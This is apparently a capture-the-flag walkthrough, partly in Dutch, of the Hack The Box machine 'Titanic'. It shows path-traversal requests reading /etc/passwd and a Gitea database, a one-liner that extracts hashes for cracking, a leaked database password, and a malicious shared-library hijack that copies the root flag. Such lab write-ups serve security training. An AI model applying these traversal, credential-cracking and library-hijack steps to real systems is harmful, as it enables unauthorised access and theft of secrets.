![[Pasted image 20250216200051.png]]
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap 10.129.186.36                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 20:01 CET
Nmap scan report for 10.129.186.36
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds

```

### Detailed port scan

At the gedatialized port scan go to get more information from the services dien are open the ip address.

```
nmap -p22,80 -sCV 10.129.186.36 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 20:02 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
Initiating Ping Scan at 20:02
Scanning 10.129.186.36 [4 ports]
Completed Ping Scan at 20:02, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:02
Completed Parallel DNS resolution of 1 host. at 20:02, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:02
Scanning 10.129.186.36 [2 ports]
Discovered open port 22/tcp on 10.129.186.36
Discovered open port 80/tcp on 10.129.186.36
Completed SYN Stealth Scan at 20:02, 0.08s elapsed (2 total ports)
Initiating Service scan at 20:02
Scanning 2 services on 10.129.186.36
Completed Service scan at 20:02, 6.17s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.186.36.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 1.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
Nmap scan report for 10.129.186.36
Host is up, received echo-reply ttl 63 (0.024s latency).
Scanned at 2025-02-16 20:02:01 CET for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

I will add the FQDN to the hosts file.

```
sudo nano /etc/hosts
10.129.186.36 titanic.htb
```

there ive seen that you can book your trip. i will try to book a trip with the following credentials:

![[Pasted image 20250216201120.png]]

## Fuzzing

I fuzzed on the FQDN to see if there was much of interest to be found, but this was not really the case. I went searching on the files and directories but found nothing.

Directories
```
ffuf -u http://titanic.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

book                    [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 112ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 24ms]
                        [Status: 200, Size: 7399, Words: 2501, Lines: 156, Duration: 98ms]
:: Progress: [30000/30000] :: Job [1/1] :: 332 req/sec :: Duration: [0:01:43] :: Errors: 2 ::
```

Files
```
ffuf -u http://titanic.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -c      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.                       [Status: 200, Size: 7399, Words: 2501, Lines: 156, Duration: 81ms]
:: Progress: [17129/17129] :: Job [1/1] :: 305 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

## Local File Inclusion

I am now going to try to see if I can't download a file from the ssh server with which I can then do path traversal to get the user.txt.
I will download the hosts file from the ssh server by typing the following path into my internet browser.

```
http://titanic.htb/download?ticket=/etc/hosts
```

This will download the hosts file and when we go to open it you will see below that a subdomain “dev.titanic.htb” is known. I then added it to my own hosts file. 
So now I tried the same thing to get the “/etc/passwd” file so I can see which users are known and abuse it to find the user.txt file.

```
http://titanic.htb/download?ticket=/etc/passwd
```

Now if I will open the file you will see the following below.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

There is a home user “developer” known, because I know this now I will do a path traversal to get the user.txt file and with that I have the first flag. Below you will see that I have found the first user flag by means of a path traversal command.

`User flag = 50bf44c00d34639765498a94ab40a4d4`

```
curl -X GET "http://titanic.htb/download?ticket=..%2F..%2F..%2F..%2F..%2Fhome%2Fdeveloper%2Fuser.txt" 
50bf44c00d34639765498a94ab40a4d4
```

I have now gone to look at the web page of “dev.titanic.htb”. here we see that it is hosted via Gitea version 1.22.1. Am I also went to do a directory fuzzing to see if nothing interesting can be found there.

![[Pasted image 20250216210500.png]]
```
ffuf -u http://dev.titanic.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.titanic.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

administrator           [Status: 200, Size: 19998, Words: 1619, Lines: 417, Duration: 154ms]
v2                      [Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 24ms]
developer               [Status: 200, Size: 25152, Words: 2139, Lines: 506, Duration: 123ms]
Administrator           [Status: 200, Size: 19997, Words: 1619, Lines: 417, Duration: 78ms]
                        [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 29ms]
Developer               [Status: 200, Size: 25152, Words: 2139, Lines: 506, Duration: 251ms]
:: Progress: [30000/30000] :: Job [1/1] :: 507 req/sec :: Duration: [0:00:54] :: Errors: 2 ::
```

Above you can see that there are several subdirectories that have the error code 200. So this means we can start looking at these. I had gone to look at the first subdirectory “administrator” but there was nothing there. Then I went to look at the subdirectory “developer” and there was the following.

![[Pasted image 20250216211710.png]]

Within the docker config I found several interesting things, starting with the gitea folder where a docker-compose.yml file could be found. Within this file there wa a path to be found. I will give below the result that I found from the docker file.

```
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

I then now started doing a local file inclusion for the gitea database to go download.

```
http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
```

Now that the file has been downloaded I went back to the docker-config git page and found a mysql folder in which there was also a docker-compose.yml file. So I went to open this one as well and will put below the result of the file as well.

```
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

This script retrieves information from the Gitea database, such as password hashes `passwd`, salt and usernames `name`. The hashes and salts are converted to Base64, which is necessary to make them easier to test later with hashcat. Then everything is put into the format `name:sha256:50000:salt:hash` and stored in a file called `gitea.hashes`.

```
sqlite3 _home_developer_gitea_data_gitea_gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

With hashcat I went to crack the password of the user developer. 
```
┌──(kali㉿kali)-[~/HTB/Titanic]
└─$ hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 5700X 8-Core Processor, 2913/5891 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: gitea.hashes
Time.Started.....: Sun Feb 16 22:03:50 2025 (4 secs)
Time.Estimated...: Mon Feb 17 13:35:21 2025 (15 hours, 31 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      513 H/s (9.31ms) @ Accel:256 Loops:256 Thr:1 Vec:8
Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 2048/28688770 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 1024/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5888-6144
Candidate.Engine.: Device Generator
Candidates.#1....: kucing -> lovers1
Hardware.Mon.#1..: Util: 97%

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
```
## Logging into SSH

### Gaining SSH Access with Cracked Password

Using the cracked password, SSH access to the `developer` account on the target machine is achieved:

```
ssh developer@titanic.htb                                                   
The authenticity of host 'titanic.htb (10.129.186.36)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'titanic.htb' (ED25519) to the list of known hosts.
developer@titanic.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Feb 16 09:06:37 PM UTC 2025

  System load:           0.3
  Usage of /:            74.3% of 6.79GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.186.36
  IPv6 address for eth0: dead:beef::250:56ff:fe94:8633


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


developer@titanic:~$ 

```

Now I downloaded linpeas and started it to see if there wasn't something interesting I could exploit. The following came out of this.

Readable host files die dat ik kan lezen met de user developer.
```
-rw-r----- 1 root developer 33 Feb 16 19:01 /home/developer/user.txt                                                
lrwxrwxrwx 1 root root 9 Jan 29 12:27 /home/developer/.bash_history -> /dev/null
-r--r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.events
-r--r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.events
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/io.pressure
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.events.local                                                                                                                   
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.current                                                                                                                   
-rw-r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.max
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.events
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.max.descendants                                                                                                                
-r--r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cpu.stat
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.pressure
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.current
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/pids.current
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.stat
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/pids.events
-rw-r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.low
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cpu.pressure
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.type
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.stat
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.high
-r--r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.numa_stat
--w------- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.kill
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.freeze
-rw-r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.min
-r--r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.controllers
-rw-r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.oom.group
-rw-r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.max
-rw-r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.high
-rw-r--r-- 1 root root 0 Feb 16 21:06 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/pids.max
-rw-r--r-- 1 root root 0 Feb 16 21:20 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.max.depth

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root developer 7568 Aug  1  2024 /opt/app/templates/index.html                                         
-rw-r----- 1 root developer 209762 Feb  3 17:13 /opt/app/static/assets/images/favicon.ico
-rw-r----- 1 root developer 280817 Feb  3 17:13 /opt/app/static/assets/images/luxury-cabins.jpg
-rw-r----- 1 root developer 291864 Feb  3 17:13 /opt/app/static/assets/images/entertainment.jpg
-rw-r----- 1 root developer 232842 Feb  3 17:13 /opt/app/static/assets/images/home.jpg
-rw-r----- 1 root developer 280854 Feb  3 17:13 /opt/app/static/assets/images/exquisite-dining.jpg
-rw-r----- 1 root developer 442 Feb 16 21:21 /opt/app/static/assets/images/metadata.log
-rw-r----- 1 root developer 567 Aug  1  2024 /opt/app/static/styles.css
-rwxr-x--- 1 root developer 1598 Aug  2  2024 /opt/app/app.py
-rw-r----- 1 root developer 33 Feb 16 19:01 /home/developer/user.txt
-rw-r-----+ 1 root systemd-journal 41943040 Feb 16 19:20 /var/log/journal/3010787ce58f43a9a8f1c8c49cb903e8/user-1000@e8ac234aac684ca08cd31e6eaf167576-0000000000031f16-00062e472b98402c.journal                                         
-rw-r-----+ 1 root systemd-journal 41943040 Feb 16 19:11 /var/log/journal/3010787ce58f43a9a8f1c8c49cb903e8/user-1000@e8ac234aac684ca08cd31e6eaf167576-000000000001588d-00062dcefcf59694.journal                                         
-rw-r-----+ 1 root systemd-journal 41943040 Feb 16 21:20 /var/log/journal/3010787ce58f43a9a8f1c8c49cb903e8/user-1000@e8ac234aac684ca08cd31e6eaf167576-00000000000511d9-00062e474cd35213.journal                                         
-rw-r-----+ 1 root systemd-journal 8388608 Feb 16 21:20 /var/log/journal/3010787ce58f43a9a8f1c8c49cb903e8/user-1000.journal
```

Within this path, you will be able to start compiling a malicious shared library that that is geschared with the root user.
```
developer@titanic:/opt$ cd app/static/assets/images/
developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg  exquisite-dining.jpg  favicon.ico  home.jpg  luxury-cabins.jpg  metadata.log
```

### Library Hijacking Exploit

Dit script maakt een kwaadaardige gedeelde bibliotheek (`libxcb.so.1`) die automatisch wordt uitgevoerd wanneer deze door een programma wordt geladen. De bibliotheek kopieert de inhoud van `/root/root.txt` naar `/tmp/root.txt`, waardoor toegang wordt verkregen tot een beveiligd bestand zonder de juiste rechten. Dit werkt als een **Library Hijacking** exploit, waarbij een programma per ongeluk de kwaadaardige bibliotheek laadt. Vervolgens controleert het script of de exploit gelukt is door te kijken of `/tmp/root.txt`. https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2 en chatgpt te gebruiken ben ik aan de volgende uitkomst gekomen waarmee ik de root file zal te pakken krijgen.

```
developer@titanic:/opt/app/static/assets/images$ nano test.sh

#!/bin/bash

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF

cp entertainment.jpg root.jpg

if [ -f /tmp/root.txt ]; then
    echo "FLAG GG:"
    cat /tmp/root.txt
else
    echo "FLAG No GG!"
fi
Dit is de code dat ik heb gebruikt voor 
developer@titanic:/opt/app/static/assets/images$ chmod +x test.sh 
developer@titanic:/opt/app/static/assets/images$ ./test.sh
FLAG No GG!
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

attribute((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
<stdin>:5:11: error: expected declaration specifiers or ‘...’ before ‘(’ token
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

attribute((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
<stdin>:5:11: error: expected declaration specifiers or ‘...’ before ‘(’ token
developer@titanic:/opt/app/static/assets/images$ cp entertainment.jpg root.jpg
developer@titanic:/opt/app/static/assets/images$ cat /tmp/root.txt 
3836b85ad5422c273a521fd21ed77330

```

## Rooted

![[Pasted image 20250216223534.png]]